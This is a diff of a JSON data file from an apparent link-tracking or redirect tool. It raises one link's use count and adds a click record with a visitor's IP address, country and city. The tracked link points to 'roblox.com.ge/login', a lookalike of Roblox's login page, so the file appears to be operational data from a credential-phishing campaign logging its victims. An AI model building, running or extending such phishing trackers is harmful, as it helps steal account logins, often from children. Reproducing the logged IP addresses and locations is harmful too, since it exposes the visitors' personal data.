@@ -110,7 +110,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 848,
+    "useCount": 849,
     "createdBy": "admin",
     "clicks": [
       {
@@ -6896,6 +6896,14 @@
         "city": "Chí Linh",
         "flag": "🇻🇳",
         "countryCode": "VN"
+      },
+      {
+        "timestamp": 1777179945883,
+        "ip": "180.190.173.189",
+        "country": "Philippines",
+        "city": "Caloocan",
+        "flag": "🇵🇭",
+        "countryCode": "PH"
       }
     ]
   },
